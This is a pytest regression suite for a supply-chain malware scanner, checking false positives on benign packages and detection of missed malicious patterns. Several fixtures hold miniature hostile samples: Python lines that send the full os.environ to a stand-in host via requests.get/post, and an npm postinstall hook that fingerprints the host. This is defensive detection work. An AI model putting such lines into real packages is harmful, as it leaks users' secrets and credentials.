"""Regression tests for problems found when testing on REAL packages (v0.2).

Each test reproduces, in miniature, a pattern seen in a real benign package that v0.1
flagged wrongly, or in a real malicious package that v0.1 missed.
"""
import json
from pathlib import Path

from supplyshield.analyzer import scan


def write(tmp_path: Path, files: dict[str, str]) -> Path:
    for name, content in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    return tmp_path


def py_pkg(tmp_path, code, path="lib/__init__.py"):
    return write(tmp_path, {"pyproject.toml": '[project]\nname="lessonpkg"\nversion="1"\n', path: code})


def rules(r):
    return {f.rule_id for f in r.findings if f.severity != "low"}


# ---- false alarms seen in real benign packages ------------------------------------------
def test_network_helpers_are_not_network_access(tmp_path):
    # requests / urllib3: parse_url(), Retry(), socket.inet_aton() do not open connections
    r = scan(py_pkg(tmp_path, "import socket\nfrom urllib3.util import parse_url, Retry\n"
                              "parse_url('http://x'); Retry(0); socket.inet_aton('1.2.3.4')\n"))
    assert "PY-NETWORK" not in rules(r)


def test_real_connection_is_still_network(tmp_path):
    r = scan(py_pkg(tmp_path, "import requests\nrequests.get('https://x.invalid')\n"))
    assert "PY-NETWORK" in rules(r)


def test_environment_copy_for_subprocess_is_low(tmp_path):
    # cffi / charset-normalizer: env = os.environ.copy(); subprocess.run(..., env=env)
    r = scan(py_pkg(tmp_path, "import os\nenv = os.environ.copy()\nenv2 = dict(os.environ)\n"))
    assert "PY-ENV-DUMP" not in rules(r) and r.verdict == "SAFE"


def test_npm_listing_env_names_is_low(tmp_path):
    # debug: Object.keys(process.env).filter(k => /^debug_/i.test(k))
    root = write(tmp_path, {"package.json": json.dumps({"name": "dbg", "version": "1.0.0"}),
                            "src/node.js": "exports.o = Object.keys(process.env).filter(k => /^debug_/i.test(k));\n"})
    assert scan(root).verdict == "SAFE"


def test_exec_in_tests_and_docs_is_low(tmp_path):
    # typing-extensions tests, packaging docs/conf.py
    root = write(tmp_path, {"pyproject.toml": '[project]\nname="lessonpkg"\nversion="1"\n',
                            "src/test_thing.py": "exec(code, {})\nexec(code2, {})\n",
                            "docs/conf.py": "exec(f.read(), about)\n"})
    assert scan(root).verdict == "SAFE"


def test_exec_in_library_code_is_medium(tmp_path):
    r = scan(py_pkg(tmp_path, "def f(v, g):\n    return eval(v, g)\n"))
    assert {f.severity for f in r.findings if f.rule_id == "PY-DYNAMIC-EXEC"} == {"medium"}
    assert r.verdict == "SAFE"


# ---- malware patterns v0.1 missed --------------------------------------------------------
def test_environment_sent_as_text_is_theft(tmp_path):
    # real sample: requests.get(url + os.environ.__str__())
    r = scan(py_pkg(tmp_path, "import os, requests\nrequests.get('https://x.invalid/' + os.environ.__str__())\n"))
    assert "PY-ENV-DUMP" in rules(r) and r.verdict == "MALICIOUS"


def test_environment_in_fstring_is_theft(tmp_path):
    r = scan(py_pkg(tmp_path, "import os, requests\nrequests.post('https://x.invalid', data=f'{os.environ}')\n"))
    assert "PY-ENV-DUMP" in rules(r)


def test_install_time_host_fingerprinting(tmp_path):
    # real sample: postinstall script printing os.hostname() (dependency-confusion probe)
    root = write(tmp_path, {
        "package.json": json.dumps({"name": "probe", "version": "0.0.1",
                                    "scripts": {"postinstall": "node postinstall.js"}}),
        "postinstall.js": "const os = require('os');\nconsole.log('host ' + os.hostname());\n"})
    r = scan(root)
    assert "NPM-RECON" in rules(r)
    assert any("reconnaissance" in c for c in r.chains) and r.verdict != "SAFE"


def test_unreadable_file_is_reported_not_crashed(tmp_path, monkeypatch):
    # real sample: antivirus blocked reading auto.js and v0.1 crashed
    root = write(tmp_path, {"package.json": json.dumps({"name": "x", "version": "1.0.0"}),
                            "auto.js": "console.log(1)\n"})
    real_read = Path.read_text

    def blocked(self, *a, **k):
        if self.name == "auto.js":
            raise OSError(22, "Invalid argument")
        return real_read(self, *a, **k)

    monkeypatch.setattr(Path, "read_text", blocked)
    r = scan(root)
    assert any(f.rule_id == "FILE-UNREADABLE" for f in r.findings)
